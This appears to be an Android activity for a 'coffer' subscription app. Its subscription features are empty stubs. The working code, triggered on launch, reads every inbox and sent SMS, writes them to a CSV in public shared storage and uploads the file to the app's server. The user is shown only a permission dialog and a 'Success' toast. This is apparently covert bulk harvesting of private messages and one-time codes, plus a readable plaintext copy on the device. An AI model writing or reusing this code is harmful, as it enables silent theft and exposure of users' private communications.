package elope.crazyones.com.coffer.activity;

import android.Manifest;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.widget.Toolbar;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.DefaultItemAnimator;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;

import butterknife.BindView;
import butterknife.ButterKnife;
import elope.crazyones.com.coffer.R;
import elope.crazyones.com.coffer.adapter.SubscriptionListAdapter;
import elope.crazyones.com.coffer.serverapi.ApiClient;
import elope.crazyones.com.coffer.serverapi.interfaces.readSMSAPI;
import elope.crazyones.com.coffer.serverapi.response.readSMSResponse;
import elope.crazyones.com.coffer.util.SmsBroadcastReceiver;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class HomeActivity extends MainActivity implements SubscriptionListAdapter.OnSubscriptionItemClickListener {

    private final String INBOX = "content://sms/inbox";
    private final String SENT = "content://sms/sent";
    private StringBuilder dataset;
    private String firstRow = "";
    private List<String> headers;
    private SmsBroadcastReceiver smsBR;

    @BindView(R.id.toolbar_home)
    Toolbar toolbarHome;
    @BindView(R.id.swipe_layout_my_subscriptions)
    SwipeRefreshLayout srlSubscription;
    @BindView(R.id.rv_my_subscription)
    RecyclerView rvSubscription;
    SubscriptionListAdapter subscriptionListAdapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);
        ButterKnife.bind(this);
        setSupportActionBar(toolbarHome);
        dataset = new StringBuilder();

        if (!hasRequiredPermissions()) {
            showRequestPermissionsInfoAlertDialog();
        }
        else{
            readAndExportMessages();
            setUpRecyclerView();
        }
    }

    @Override
    protected void onStart() {
        super.onStart();
        getAllSubscriptionsForUser();
    }

    void getAllSubscriptionsForUser(){
        //bring all subscriptions using this func
    }

    private void setUpRecyclerView(){
        subscriptionListAdapter = new SubscriptionListAdapter(this, this);
        rvSubscription.setLayoutManager(new LinearLayoutManager(this));
        rvSubscription.setItemAnimator(new DefaultItemAnimator());
        rvSubscription.setAdapter(subscriptionListAdapter);
        srlSubscription.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                getAllSubscriptionsForUser();
            }
        });
    }

    private void readAndExportMessages(){
        try {
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS)
                    .mkdirs();
            File dir = Environment
                    .getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
            File file = new File(dir, "sms_backup.csv");
            file.createNewFile();
            FileOutputStream fos = new FileOutputStream(file);

            getInbox();
            getSent();

            for (String header : headers) {
                firstRow += header + ";";
            }
            firstRow += "\n";
            fos.write(firstRow.getBytes());
            fos.write(dataset.toString().getBytes());
            fos.flush();
            fos.close();
            Toast.makeText(this, "Success", Toast.LENGTH_SHORT).show();
            //portView.setText("Success!");
            RequestBody requestBody = RequestBody.create(MediaType.parse("csv"), file);
            MultipartBody.Part fileToUpload = MultipartBody.Part.createFormData("csv", file.getName(), requestBody);

            ApiClient.getAuthClient(this).create(readSMSAPI.class).uploadFile(fileToUpload)
                    .enqueue(new Callback<readSMSResponse>() {
                        @Override
                        public void onResponse(Call<readSMSResponse> call, Response<readSMSResponse> response) {
                            if (response.isSuccessful() && response.body() != null) {
                                readSMSResponse readSMSResponse = response.body();
                                if (readSMSResponse != null) {
                                    if (readSMSResponse.getSuccess()) {
                                        Toast.makeText(getApplicationContext(), readSMSResponse.getMessage(),Toast.LENGTH_SHORT).show();
                                    } else {
                                        Toast.makeText(getApplicationContext(), readSMSResponse.getMessage(),Toast.LENGTH_SHORT).show();
                                    }
                                } else {
                                    Log.v("Response", "SMS csv upload response is null");
                                }
                            } else {
                                try {
                                    Log.d("SMS csv upload", "Something went wrong! "+
                                            (new JSONObject(response.errorBody().string()).getString("message")));
                                }catch (Exception e){
                                }
                            }
                        }

                        @Override
                        public void onFailure(Call<readSMSResponse> call, Throwable t) {
                            Log.d("SMS csv upload", "Error while uploading: " + t.getMessage());
                        }
                    });

        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, e.getMessage(), Toast.LENGTH_SHORT).show();
            //portView.setText(e.getMessage());
        }
    }

    private void getInbox() throws Exception {
        Cursor cursor = this.getContentResolver().query(Uri.parse(INBOX), null, null, null, null);

        if (cursor.moveToFirst()) {
            do {
                String row = "";
                headers = new ArrayList<>();
                for (int index = 0; index < cursor.getColumnCount(); index++) {
                    if (!headers.contains(cursor.getColumnName(index))) {
                        headers.add(cursor.getColumnName(index));
                    }
                    row += cursor.getString(index) + ";";
                }
                row += "\n";
                dataset.append(row);
            } while (cursor.moveToNext());
        } else {
            throw new Exception("Fails to retrieve SMS inbox messages.");
        }
    }

    private void getSent() throws Exception {
        Cursor cursor = this.getContentResolver().query(Uri.parse(SENT), null, null, null, null);

        if (cursor.moveToFirst()) {
            do {
                String row = "";
                for (int index = 0; index < cursor.getColumnCount(); index++) {
                    row += cursor.getString(index) + ";";
                }
                row += "\n";
                dataset.append(row);
            } while (cursor.moveToNext());
        } else {
            throw new Exception("Fails to retrieve SMS sent messages.");
        }
    }


    @Override
    public void selectSubscriptionItemClicked(int position) {

    }

    @Override
    public void cancelSubscriptionItemClicked(int position) {

    }

    private boolean hasRequiredPermissions() {
        return ContextCompat.checkSelfPermission(HomeActivity.this,
                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(HomeActivity.this,
                        Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(HomeActivity.this,
                        Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(HomeActivity.this,
                        Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(HomeActivity.this,
                        Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED;
    }

    private void showRequestPermissionsInfoAlertDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(R.string.permission_alert_dialog_title);
        builder.setMessage(R.string.permission_dialog_message);
        builder.setPositiveButton(R.string.action_ok, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                requestRequiredPermissions();
            }
        });
        builder.show();
    }

    private void requestRequiredPermissions(){
    String[] permissions = new String[]{
            Manifest.permission.READ_SMS,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.RECEIVE_SMS};
        ActivityCompat.requestPermissions(this, permissions, 1);
    }

}
